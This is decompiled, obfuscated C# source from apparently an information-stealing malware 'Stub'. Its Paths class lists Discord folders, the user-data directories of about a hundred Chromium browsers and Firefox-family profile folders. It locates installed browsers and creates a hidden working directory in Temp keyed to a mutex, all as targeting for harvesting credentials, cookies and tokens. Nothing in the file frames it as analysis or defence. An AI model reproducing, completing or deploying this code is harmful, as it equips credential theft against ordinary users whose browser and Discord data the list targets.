using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x0200009C RID: 156
	public sealed class Paths
	{
		// Token: 0x06000228 RID: 552 RVA: 0x00014CF4 File Offset: 0x00012EF4
		static Paths()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			Paths.commonAppdata = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
			Paths.localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			Paths.roamingAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			Paths._programFiles = null;
			Paths.programFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
			Paths.DiscordPaths = new string[]
			{
				Paths.roamingAppData + "\\Discord",
				Paths.roamingAppData + "\\DiscordCanary",
				Paths.roamingAppData + "\\DiscordPTB",
				Paths.roamingAppData + "\\DiscordDevelopment",
				Paths.roamingAppData + "\\Lightcord"
			};
			Paths.ChromiumBrowsersLikelyLocations = new Dictionary<string, string[]>();
			Paths.ChromiumBrowsers = new Dictionary<string, string>
			{
				{
					"Google Chrome",
					Paths.localAppData + "\\Google\\Chrome\\User Data"
				},
				{
					"Google Chrome Beta",
					Paths.localAppData + "\\Google\\Chrome Beta\\User Data"
				},
				{
					"Google Chrome SxS",
					Paths.localAppData + "\\Google\\Chrome SxS\\User Data"
				},
				{
					"Google Chrome Dev",
					Paths.localAppData + "\\Google\\Chrome Dev\\User Data"
				},
				{
					"Google Chrome Unstable",
					Paths.localAppData + "\\Google\\Chrome Unstable\\User Data"
				},
				{
					"Google Chrome Canary",
					Paths.localAppData + "\\Google\\Chrome Canary\\User Data"
				},
				{
					"Google Chrome (x86)",
					Paths.localAppData + "\\Google(x86)\\Chrome\\User Data"
				},
				{
					"Google Chrome Beta (x86)",
					Paths.localAppData + "\\Google(x86)\\Chrome Beta\\User Data"
				},
				{
					"Google Chrome SxS (x86)",
					Paths.localAppData + "\\Google(x86)\\Chrome SxS\\User Data"
				},
				{
					"Google Chrome Dev (x86)",
					Paths.localAppData + "\\Google(x86)\\Chrome Dev\\User Data"
				},
				{
					"Google Chrome Unstable (x86)",
					Paths.localAppData + "\\Google(x86)\\Chrome Unstable\\User Data"
				},
				{
					"Google Chrome Canary (x86)",
					Paths.localAppData + "\\Google(x86)\\Chrome Canary\\User Data"
				},
				{
					"Chromium",
					Paths.localAppData + "\\Chromium\\User Data"
				},
				{
					"Microsoft Edge",
					Paths.localAppData + "\\Microsoft\\Edge\\User Data"
				},
				{
					"Brave Browser",
					Paths.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"
				},
				{
					"Epic Privacy Browser",
					Paths.localAppData + "\\Epic Privacy Browser\\User Data"
				},
				{
					"Amigo",
					Paths.localAppData + "\\Amigo\\User Data"
				},
				{
					"Vivaldi",
					Paths.localAppData + "\\Vivaldi\\User Data"
				},
				{
					"Kometa",
					Paths.localAppData + "\\Kometa\\User Data"
				},
				{
					"Orbitum",
					Paths.localAppData + "\\Orbitum\\User Data"
				},
				{
					"Mail.Ru Atom",
					Paths.localAppData + "\\Mail.Ru\\Atom\\User Data"
				},
				{
					"Comodo Dragon",
					Paths.localAppData + "\\Comodo\\Dragon\\User Data"
				},
				{
					"Torch",
					Paths.localAppData + "\\Torch\\User Data"
				},
				{
					"Comodo",
					Paths.localAppData + "\\Comodo\\User Data"
				},
				{
					"360ChromeX",
					Paths.localAppData + "\\360ChromeX\\Chrome\\User Data"
				},
				{
					"Slimjet",
					Paths.localAppData + "\\Slimjet\\User Data"
				},
				{
					"360Browser",
					Paths.localAppData + "\\360Chrome\\Chrome\\User Data"
				},
				{
					"360Browser SE6",
					Paths.roamingAppData + "\\360se6\\User Data"
				},
				{
					"360Browser SE",
					Paths.roamingAppData + "\\360se\\User Data"
				},
				{
					"360 Secure Browser",
					Paths.localAppData + "\\360Browser\\Browser\\User Data"
				},
				{
					"Maxthon3",
					Paths.localAppData + "\\Maxthon3\\User Data"
				},
				{
					"Maxthon5",
					Paths.roamingAppData + "\\Maxthon5\\Users"
				},
				{
					"Maxthon",
					Paths.localAppData + "\\Maxthon\\User Data"
				},
				{
					"QQBrowser",
					Paths.localAppData + "\\Tencent\\QQBrowser\\User Data"
				},
				{
					"K-Meleon",
					Paths.localAppData + "\\K-Melon\\User Data"
				},
				{
					"Xpom",
					Paths.localAppData + "\\Xpom\\User Data"
				},
				{
					"Lenovo Browser",
					Paths.localAppData + "\\Lenovo\\SLBrowser"
				},
				{
					"Xvast",
					Paths.localAppData + "\\Xvast\\User Data"
				},
				{
					"Go!",
					Paths.localAppData + "\\Go!\\User Data"
				},
				{
					"Safer Secure Browser",
					Paths.localAppData + "\\Safer Technologies\\Secure Browser\\User Data"
				},
				{
					"Sputnik",
					Paths.localAppData + "\\Sputnik\\Sputnik\\User Data"
				},
				{
					"Nichrome",
					Paths.localAppData + "\\Nichrome\\User Data"
				},
				{
					"CocCoc Browser",
					Paths.localAppData + "\\CocCoc\\Browser\\User Data"
				},
				{
					"Uran",
					Paths.localAppData + "\\uCozMedia\\Uran\\User Data"
				},
				{
					"Chromodo",
					Paths.localAppData + "\\Chromodo\\User Data"
				},
				{
					"Yandex Browser",
					Paths.localAppData + "\\Yandex\\YandexBrowser\\User Data"
				},
				{
					"Yandex Browser Canary",
					Paths.localAppData + "\\Yandex\\YandexBrowserCanary\\User Data"
				},
				{
					"Yandex Browser Dev",
					Paths.localAppData + "\\Yandex\\YandexBrowserDeveloper\\User Data"
				},
				{
					"Yandex Browser Beta",
					Paths.localAppData + "\\Yandex\\YandexBrowserBeta\\User Data"
				},
				{
					"Yandex Browser Tech",
					Paths.localAppData + "\\Yandex\\YandexBrowserTech\\User Data"
				},
				{
					"Yandex Browser SxS",
					Paths.localAppData + "\\Yandex\\YandexBrowserSxS\\User Data"
				},
				{
					"7Star",
					Paths.localAppData + "\\7Star\\7Star\\User Data"
				},
				{
					"Chedot",
					Paths.localAppData + "\\Chedot\\User Data"
				},
				{
					"CentBrowser",
					Paths.localAppData + "\\CentBrowser\\User Data"
				},
				{
					"Iridium",
					Paths.localAppData + "\\Iridium\\User Data"
				},
				{
					"Opera Stable",
					Paths.roamingAppData + "\\Opera Software\\Opera Stable"
				},
				{
					"Opera Neon",
					Paths.roamingAppData + "\\Opera Software\\Opera Neon\\User Data"
				},
				{
					"Opera Crypto Developer",
					Paths.roamingAppData + "\\Opera Software\\Opera Crypto Developer"
				},
				{
					"Opera GX",
					Paths.roamingAppData + "\\Opera Software\\Opera GX Stable"
				},
				{
					"Elements Browser",
					Paths.localAppData + "\\Elements Browser\\User Data"
				},
				{
					"Citrio",
					Paths.localAppData + "\\CatalinaGroup\\Citrio\\User Data"
				},
				{
					"Sleipnir5 ChromiumViewer",
					Paths.localAppData + "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"
				},
				{
					"QIP Surf",
					Paths.localAppData + "\\QIP Surf\\User Data"
				},
				{
					"Liebao",
					Paths.localAppData + "\\liebao\\User Data"
				},
				{
					"Coowon",
					Paths.localAppData + "\\Coowon\\Coowon\\User Data"
				},
				{
					"ChromePlus",
					Paths.localAppData + "\\MapleStudio\\ChromePlus\\User Data"
				},
				{
					"Rafotech Mustang",
					Paths.localAppData + "\\Rafotech\\Mustang\\User Data"
				},
				{
					"Suhba",
					Paths.localAppData + "\\Suhba\\User Data"
				},
				{
					"TorBro",
					Paths.localAppData + "\\TorBro\\Profile"
				},
				{
					"RockMelt",
					Paths.localAppData + "\\RockMelt\\User Data"
				},
				{
					"Bromium",
					Paths.localAppData + "\\Bromium\\User Data"
				},
				{
					"Twinkstar",
					Paths.localAppData + "\\Twinkstar\\User Data"
				},
				{
					"iTop Private Browser",
					Paths.localAppData + "\\iTop Private Browser\\User Data"
				},
				{
					"CCleaner Browser",
					Paths.localAppData + "\\CCleaner Browser\\User Data"
				},
				{
					"AcWebBrowser",
					Paths.localAppData + "\\AcWebBrowser\\User Data"
				},
				{
					"CoolNovo",
					Paths.localAppData + "\\CoolNovo\\User Data"
				},
				{
					"Baidu Spark",
					Paths.localAppData + "\\Baidu Spark\\User Data"
				},
				{
					"SRWare Iron",
					Paths.localAppData + "\\SRWare Iron\\User Data"
				},
				{
					"Titan Browser",
					Paths.localAppData + "\\Titan Browser\\User Data"
				},
				{
					"AVAST Browser",
					Paths.localAppData + "\\AVAST Software\\Browser\\User Data"
				},
				{
					"AVG Browser",
					Paths.localAppData + "\\AVG\\Browser\\User Data"
				},
				{
					"UCBrowser",
					Paths.localAppData + "\\UCBrowser\\User Data_i18n"
				},
				{
					"URBrowser",
					Paths.localAppData + "\\UR Browser\\User Data"
				},
				{
					"Blisk",
					Paths.localAppData + "\\Blisk\\User Data"
				},
				{
					"Flock",
					Paths.localAppData + "\\Flock\\User Data"
				},
				{
					"CryptoTab Browser",
					Paths.localAppData + "\\CryptoTab Browser\\User Data"
				},
				{
					"Sidekick",
					Paths.localAppData + "\\Sidekick\\User Data"
				},
				{
					"SwingBrowser",
					Paths.localAppData + "\\SwingBrowser\\User Data"
				},
				{
					"Superbird",
					Paths.localAppData + "\\Superbird\\User Data"
				},
				{
					"SalamWeb",
					Paths.localAppData + "\\SalamWeb\\User Data"
				},
				{
					"GhostBrowser",
					Paths.localAppData + "\\GhostBrowser\\User Data"
				},
				{
					"NetboxBrowser",
					Paths.localAppData + "\\NetboxBrowser\\User Data"
				},
				{
					"GarenaPlus",
					Paths.localAppData + "\\GarenaPlus\\User Data"
				},
				{
					"Kinza",
					Paths.localAppData + "\\Kinza\\User Data"
				},
				{
					"InsomniacBrowser",
					Paths.localAppData + "\\InsomniacBrowser\\User Data"
				},
				{
					"ViaSat Browser",
					Paths.localAppData + "\\ViaSat\\Viasat Browser\\User Data"
				},
				{
					"Naver Whale",
					Paths.localAppData + "\\Naver\\Naver Whale\\User Data"
				},
				{
					"Falkon",
					Paths.localAppData + "\\falkon\\profiles"
				},
				{
					"Sogou",
					Paths.roamingAppData + "\\SogouExplorer\\Webkit"
				}
			};
			Paths.GeckoBrowsers = new Dictionary<string, string>
			{
				{
					"Firefox",
					Paths.roamingAppData + "\\Mozilla\\Firefox\\Profiles"
				},
				{
					"SeaMonkey",
					Paths.roamingAppData + "\\Mozilla\\SeaMonkey\\Profiles"
				},
				{
					"Waterfox",
					Paths.roamingAppData + "\\Waterfox\\Profiles"
				},
				{
					"Waterfox Classic",
					Paths.roamingAppData + "\\Waterfox\\Profiles"
				},
				{
					"K-Meleon",
					Paths.roamingAppData + "\\K-Meleon\\Profiles"
				},
				{
					"Thunderbird",
					Paths.roamingAppData + "\\Thunderbird\\Profiles"
				},
				{
					"Epyrus",
					Paths.roamingAppData + "\\Athenian200\\Epyrus\\Profiles"
				},
				{
					"Interlink",
					Paths.roamingAppData + "\\BinaryOutcast\\Interlink\\Profiles"
				},
				{
					"IceDragon",
					Paths.roamingAppData + "\\Comodo\\IceDragon\\Profiles"
				},
				{
					"Cyberfox",
					Paths.roamingAppData + "\\8pecxstudios\\Cyberfox\\Profiles"
				},
				{
					"BlackHawk",
					Paths.roamingAppData + "\\NETGATE Technologies\\BlackHawk\\Profiles"
				},
				{
					"Pale Moon",
					Paths.roamingAppData + "\\Moonchild Productions\\Pale Moon\\Profiles"
				},
				{
					"Basilisk",
					Paths.roamingAppData + "\\Moonchild Productions\\Basilisk\\Profiles"
				},
				{
					"BitTube",
					Paths.roamingAppData + "\\BitTube\\BitTubeBrowser\\Profiles"
				},
				{
					"SlimBrowser",
					Paths.roamingAppData + "\\FlashPeak\\SlimBrowser\\Profiles"
				}
			};
			string[] installedBrowsers = Utils.GetInstalledBrowsers();
			foreach (string text in Paths.ChromiumBrowsers.Keys)
			{
				string text2 = Paths.RemoveEnvVarFromPath(Paths.ChromiumBrowsers[text]).ToLower();
				string name = new DirectoryInfo(text2).Name;
				if (name.Contains("user"))
				{
					text2 = text2.Substring(0, text2.Length - name.Length - 1);
				}
				List<ValueTuple<string, double>> list = new List<ValueTuple<string, double>>();
				foreach (string text3 in installedBrowsers)
				{
					string text4 = Paths.RemoveEnvVarFromPath(Path.GetDirectoryName(text3)).ToLower();
					double num = Utils.CalculateStringSimilarity(text4, text2);
					if (list.Count < 3)
					{
						list.Add(new ValueTuple<string, double>(text3, num));
					}
					else
					{
						ValueTuple<string, double> valueTuple = list.OrderBy(([TupleElementNames(new string[] { "LibraryPath", "Similarity" })] ValueTuple<string, double> x) => x.Item2).First<ValueTuple<string, double>>();
						if (num > valueTuple.Item2)
						{
							list.Remove(valueTuple);
							list.Add(new ValueTuple<string, double>(text3, num));
						}
					}
				}
				list = list.OrderByDescending(([TupleElementNames(new string[] { "LibraryPath", "Similarity" })] ValueTuple<string, double> x) => x.Item2).ToList<ValueTuple<string, double>>();
				Paths.ChromiumBrowsersLikelyLocations[text] = list.Select(([TupleElementNames(new string[] { "LibraryPath", "Similarity" })] ValueTuple<string, double> x) => x.Item1).ToArray<string>();
			}
		}

		// Token: 0x06000229 RID: 553 RVA: 0x00015AEC File Offset: 0x00013CEC
		private static string RemoveEnvVarFromPath(string path)
		{
			string text = null;
			foreach (object obj in Environment.GetEnvironmentVariables().Keys)
			{
				string environmentVariable = Environment.GetEnvironmentVariable(obj.ToString());
				if (!string.IsNullOrEmpty(environmentVariable) && path.StartsWith(environmentVariable, StringComparison.OrdinalIgnoreCase) && (text == null || environmentVariable.Length > text.Length))
				{
					text = environmentVariable;
				}
			}
			string text2;
			if (text != null)
			{
				text2 = path.Replace(text, "").TrimStart(new char[]
				{
					Path.DirectorySeparatorChar,
					Path.AltDirectorySeparatorChar
				});
			}
			else
			{
				text2 = path;
			}
			return text2;
		}

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x0600022A RID: 554 RVA: 0x00015BB4 File Offset: 0x00013DB4
		public static string programFiles
		{
			get
			{
				string text;
				if (Paths._programFiles != null)
				{
					text = Paths._programFiles;
				}
				else
				{
					string text2 = Environment.GetEnvironmentVariable("ProgramW6432");
					if (text2 == null || text2 == "")
					{
						text2 = "NonExistant";
					}
					Paths._programFiles = text2;
					text = Paths._programFiles;
				}
				return text;
			}
		}

		// Token: 0x0600022B RID: 555 RVA: 0x00015C04 File Offset: 0x00013E04
		public static string InitWorkDir(string mutexName)
		{
			string text2;
			try
			{
				string text = Path.Combine(Path.GetTempPath(), StringsCrypt.GenerateRandomData(mutexName));
				Logging.Log("InitWorkDir: Generated work directory path: " + text, true);
				if (!Directory.Exists(text))
				{
					Logging.Log("InitWorkDir: Creating directory...", true);
					Directory.CreateDirectory(text);
					Logging.Log("InitWorkDir: Setting hidden attribute...", true);
					DirectoryInfo directoryInfo = new DirectoryInfo(text);
					directoryInfo.Attributes |= FileAttributes.Hidden;
					Logging.Log("InitWorkDir: Directory hidden successfully", true);
				}
				text2 = text;
			}
			catch (Exception ex)
			{
				Logging.Log("InitWorkDir: Error creating work directory: " + ex.Message + "\nStack trace: " + ex.StackTrace, true);
				throw;
			}
			return text2;
		}

		// Token: 0x0600022C RID: 556 RVA: 0x00015CC0 File Offset: 0x00013EC0
		public static string InitWorkDir()
		{
			return Paths.InitWorkDir(Config.Mutex);
		}

		// Token: 0x0600022D RID: 557 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Paths()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x040004E8 RID: 1256
		public static readonly string commonAppdata;

		// Token: 0x040004E9 RID: 1257
		public static readonly string localAppData;

		// Token: 0x040004EA RID: 1258
		public static readonly string roamingAppData;

		// Token: 0x040004EB RID: 1259
		public static string _programFiles;

		// Token: 0x040004EC RID: 1260
		public static readonly string programFilesX86;

		// Token: 0x040004ED RID: 1261
		public static string[] DiscordPaths;

		// Token: 0x040004EE RID: 1262
		public static Dictionary<string, string[]> ChromiumBrowsersLikelyLocations;

		// Token: 0x040004EF RID: 1263
		public static Dictionary<string, string> ChromiumBrowsers;

		// Token: 0x040004F0 RID: 1264
		public static Dictionary<string, string> GeckoBrowsers;
	}
}
